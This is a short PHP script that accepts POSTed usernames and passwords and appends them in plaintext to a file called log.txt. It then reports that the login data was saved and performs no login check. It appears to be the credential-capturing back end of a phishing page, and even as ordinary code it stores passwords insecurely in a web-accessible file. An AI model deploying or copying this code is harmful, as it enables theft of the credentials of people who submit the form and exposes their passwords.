<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $data = "Username: $username\nPassword: $password\n\n";

    // Specify the path and filename for the text file
    $file = 'log.txt';

    // Open the file in append mode
    $handle = fopen($file, 'a');

    // Write the data to the file
    fwrite($handle, $data);

    // Close the file
    fclose($handle);

    echo 'Login data has been saved to log.txt';
}
?>
